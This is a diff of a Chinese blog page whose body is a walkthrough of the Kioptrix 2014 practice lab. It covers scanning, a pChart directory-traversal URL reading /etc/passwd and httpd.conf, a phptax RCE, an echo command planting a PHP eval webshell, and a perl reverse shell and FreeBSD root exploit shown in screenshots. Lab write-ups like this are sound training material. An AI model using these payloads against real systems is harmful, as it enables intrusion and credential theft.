@@ -5,62 +5,62 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 6.0.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/wan1/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/wan1/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/wan1/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/wan1/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/wan1/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/wan1/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"wanheiqiyihu.gitee.io","root":"/wan1/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"wanheiqiyihu.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="Kioptrix: 2014 (#5)部署需要首先卸载原来的网卡，然后再重新安装一块网卡，记得用nat模式。 这些靶场总有一些奇奇怪怪的问题。 信息收集1nmap 192.168.100.0&#x2F;24 -n -sP -sn  首先还是通过nmpa扫描c段拿到靶机地址  192.168.100.171 然后扫描端口 1nmap -A 192.168.100.171   22,80,8080 8080端口">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Kioptrix: 2014 (#5)">
-<meta property="og:url" content="https://wanheiqiyihu.gitee.io/wan1/2022/11/03/%C2%96Kioptrix-2014-5/index.html">
+<meta property="og:url" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/index.html">
 <meta property="og:site_name" content="十三の博客">
 <meta property="og:description" content="Kioptrix: 2014 (#5)部署需要首先卸载原来的网卡，然后再重新安装一块网卡，记得用nat模式。 这些靶场总有一些奇奇怪怪的问题。 信息收集1nmap 192.168.100.0&#x2F;24 -n -sP -sn  首先还是通过nmpa扫描c段拿到靶机地址  192.168.100.171 然后扫描端口 1nmap -A 192.168.100.171   22,80,8080 8080端口">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155525638.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155649936.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155723269.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155737120.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155853459.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155948060.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160044077.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160649554.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160732137.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160921154.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161816864.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161930930.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162113090.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162520526.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162806119.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180605385.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180611718.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183515829.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183532663.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183855920.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/019E109C.jpg">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103185130159.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190319520.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190359774.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190447939.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190504541.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190526901.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155525638.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155649936.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155723269.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155737120.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155853459.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155948060.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160044077.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160649554.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160732137.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160921154.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161816864.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161930930.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162113090.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162520526.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162806119.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180605385.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180611718.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183515829.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183532663.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183855920.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/019E109C.jpg">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103185130159.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190319520.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190359774.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190447939.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190504541.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190526901.png">
 <meta property="article:published_time" content="2022-11-03T11:06:48.000Z">
 <meta property="article:modified_time" content="2022-12-19T07:45:11.589Z">
 <meta property="article:author" content="十三">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155525638.png">
+<meta name="twitter:image" content="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155525638.png">
 
-<link rel="canonical" href="https://wanheiqiyihu.gitee.io/wan1/2022/11/03/%C2%96Kioptrix-2014-5/">
+<link rel="canonical" href="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/">
 
 
 <script id="page-configurations">
@@ -122,7 +122,7 @@
 
   <div class="site-meta">
 
-    <a href="/wan1/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">十三の博客</h1>
       <span class="logo-line-after"><i></i></span>
@@ -143,92 +143,92 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/wan1/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/wan1/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-ctf做题笔记">
 
-    <a href="/wan1/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
+    <a href="/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
 
   </li>
         <li class="menu-item menu-item-python">
 
-    <a href="/wan1/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
+    <a href="/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
 
   </li>
         <li class="menu-item menu-item-java">
 
-    <a href="/wan1/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
+    <a href="/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
 
   </li>
         <li class="menu-item menu-item-读书笔记">
 
-    <a href="/wan1/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
+    <a href="/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
 
   </li>
         <li class="menu-item menu-item-渗透测试">
 
-    <a href="/wan1/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
+    <a href="/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
 
   </li>
         <li class="menu-item menu-item-基础">
 
-    <a href="/wan1/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
+    <a href="/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
 
   </li>
         <li class="menu-item menu-item-轮子">
 
-    <a href="/wan1/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
+    <a href="/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
 
   </li>
         <li class="menu-item menu-item-漏洞库">
 
-    <a href="/wan1/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
+    <a href="/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
 
   </li>
         <li class="menu-item menu-item-工具">
 
-    <a href="/wan1/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
+    <a href="/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
 
   </li>
         <li class="menu-item menu-item-代码审计">
 
-    <a href="/wan1/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
+    <a href="/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
 
   </li>
         <li class="menu-item menu-item-逆向">
 
-    <a href="/wan1/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
+    <a href="/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
 
   </li>
         <li class="menu-item menu-item-应急响应">
 
-    <a href="/wan1/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
+    <a href="/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
 
   </li>
         <li class="menu-item menu-item-免杀">
 
-    <a href="/wan1/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
+    <a href="/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
 
   </li>
         <li class="menu-item menu-item-靶场">
 
-    <a href="/wan1/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
+    <a href="/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
 
   </li>
         <li class="menu-item menu-item-cve申请">
 
-    <a href="/wan1/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
+    <a href="/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
 
   </li>
         <li class="menu-item menu-item-c语言">
 
-    <a href="/wan1/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
+    <a href="/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -286,10 +286,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2022/11/03/%C2%96Kioptrix-2014-5/">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/wan1/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="十三">
       <meta itemprop="description" content="潜心学习，不骄不躁">
     </span>
@@ -324,7 +324,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/wan1/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
+                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
                 </span>
             </span>
 
@@ -344,36 +344,36 @@
 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>
 
 <p>首先还是通过nmpa扫描c段拿到靶机地址</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155525638.png" alt="image-20221103155525638"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155525638.png" alt="image-20221103155525638"></p>
 <p><code>192.168.100.171</code></p>
 <p>然后扫描端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.100.171</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155649936.png" alt="image-20221103155649936"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155649936.png" alt="image-20221103155649936"></p>
 <p>22,80,8080</p>
 <p>8080端口是403</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155723269.png" alt="image-20221103155723269"></p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155737120.png" alt="image-20221103155737120"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155723269.png" alt="image-20221103155723269"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155737120.png" alt="image-20221103155737120"></p>
 <p>80端口有个这个页面，然后开始扫目录。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.100.171/</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155853459.png" alt="image-20221103155853459"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155853459.png" alt="image-20221103155853459"></p>
 <p>啥也没有</p>
 <p>识别一下指纹</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.100.171/index.html</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155948060.png" alt="image-20221103155948060"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155948060.png" alt="image-20221103155948060"></p>
 <p>通过识别指纹发现有这么个东西，<code>http://192.168.100.171/pChart2.1.3/index.php</code></p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160044077.png" alt="image-20221103160044077"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160044077.png" alt="image-20221103160044077"></p>
 <p>感觉就像是一个页面管理或者说是，大多cms后台那种感觉。</p>
 <p>随后百度一下<code>pChart2.1.3</code>这个的历史漏洞</p>
 <p>其实直接在kali里面搜索也有</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160649554.png" alt="image-20221103160649554"></p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160732137.png" alt="image-20221103160732137"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160649554.png" alt="image-20221103160649554"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160732137.png" alt="image-20221103160732137"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.171/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</span><br></pre></td></tr></table></figure>
 
 <p>读取到相关文件</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160921154.png" alt="image-20221103160921154"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160921154.png" alt="image-20221103160921154"></p>
 <p>尝试登录ssh，提示连接拒绝。</p>
 <p>这里我确实卡住了，我能想到和8080端口的403有关，所以我去查了下有关403的绕过。没用</p>
 <p>还是看了看攻略，这里注意，需要结合文件读取的漏洞去读取Apache的配置文件。</p>
@@ -381,42 +381,42 @@
 <p>用漏洞查看配置文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.171/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161816864.png" alt="image-20221103161816864"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161816864.png" alt="image-20221103161816864"></p>
 <p>找到定义的ua头</p>
 <p>用burp修改一下。</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161930930.png" alt="image-20221103161930930"></p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162113090.png" alt="image-20221103162113090"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161930930.png" alt="image-20221103161930930"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162113090.png" alt="image-20221103162113090"></p>
 <p>随后去访问一下那个phptax</p>
 <p>直接搜一下</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162520526.png" alt="image-20221103162520526"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162520526.png" alt="image-20221103162520526"></p>
 <p>发现有rce，最后一个，那就去看看。</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162806119.png" alt="image-20221103162806119"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162806119.png" alt="image-20221103162806119"></p>
 <p>记得中间的命令需要url编码</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180605385.png" alt="image-20221103180605385"></p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180611718.png" alt="image-20221103180611718"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180605385.png" alt="image-20221103180605385"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180611718.png" alt="image-20221103180611718"></p>
 <p>这里我尝试使用网上报出来的exp进行攻击，但是试了大概有十多分钟一直没有成功，于是我决定写入一个一句话木马来进行控制。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&#x27; &gt; test.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183515829.png" alt="image-20221103183515829"></p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183532663.png" alt="image-20221103183532663"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183515829.png" alt="image-20221103183515829"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183532663.png" alt="image-20221103183532663"></p>
 <p>然后改成POST一句话木马，用蚁剑进行连接。（我真是天才啊</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183855920.png" alt="image-20221103183855920"></p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/019E109C.jpg" alt="img"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183855920.png" alt="image-20221103183855920"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/019E109C.jpg" alt="img"></p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>不过还是无法弹一个nc回来，就用蚁剑的虚拟终端进行提权吧。</p>
 <p>首先通过<code>uname -a</code>得知版本信息</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103185130159.png" alt="image-20221103185130159"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103185130159.png" alt="image-20221103185130159"></p>
 <p>FreeBSD ，下载exp，</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190319520.png" alt="image-20221103190319520"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190319520.png" alt="image-20221103190319520"></p>
 <p>通过蚁剑上传，然后编译，编译的时候报错说是最后一行没有回车，然后加了个回车之后成功编译，但是</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190359774.png" alt="image-20221103190359774"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190359774.png" alt="image-20221103190359774"></p>
 <p>没有用，我估计是，这个蚁剑是通过webshell来执行命令的，和反弹shell并不一样，你web的权限是变不了的。</p>
 <p>后面了解到通过perl可以反弹shell回来</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190447939.png" alt="image-20221103190447939"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190447939.png" alt="image-20221103190447939"></p>
 <p>那我们就谈一个shell回来</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190504541.png" alt="image-20221103190504541"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190504541.png" alt="image-20221103190504541"></p>
 <p>直接使用编译好的okk</p>
 <p>成功拿下!</p>
-<p><img src="/wan1/wan1/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190526901.png" alt="image-20221103190526901"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190526901.png" alt="image-20221103190526901"></p>
 <p>所以正确的方法就是通过prel直接弹shell回来，没必要写一个webshell浪费时间捏。</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>反弹shell的时候多试几种，然后就是各种细节都得做好才行。</p>
 
@@ -434,11 +434,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/wan1/2022/11/02/PwnLab/" rel="prev" title="PwnLab">
+    <a href="/2022/11/02/PwnLab/" rel="prev" title="PwnLab">
       <i class="fa fa-chevron-left"></i> PwnLab
     </a></div>
       <div class="post-nav-item">
-    <a href="/wan1/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/" rel="next" title="前端加密爆破">
+    <a href="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/" rel="next" title="前端加密爆破">
       前端加密爆破 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -506,14 +506,14 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="十三"
-      src="/wan1/images/avatar.gif">
+      src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">十三</p>
   <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/wan1/archives/">
